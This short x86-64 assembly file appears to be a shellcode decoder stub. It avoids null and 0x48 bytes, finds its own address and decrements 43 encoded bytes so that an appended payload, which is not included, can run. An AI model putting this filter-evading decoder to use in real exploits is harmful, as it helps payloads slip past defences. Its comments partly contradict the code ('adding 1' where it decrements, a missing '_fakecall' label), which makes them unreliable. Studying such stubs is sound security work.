bits 64


default rel                         ; we'll use relative addressing to get RIP

_start:
                                    ; we use r14, because this will avoid the 0x48 byte
                                    ; lea eax/ecx etc emits 0x48
lea r14, [rel _shellcode+0x12345678]; we can't use it directly, because of null bytes.
sub r14, 0x12345678                 ; restore the value in r14, so it points to the encoded shellcode.

push byte 43                        ; put amount of bytes to decode
pop rcx                             ; in rcx

_decode:
dec byte [r14]                      ; start at r14 (_fakecall)
add r14, 1                          ; 'decode' by adding 1
loop _decode                        ; decode `ecx` bytes.

_shellcode:                         ; place 'encoded' shellcode here
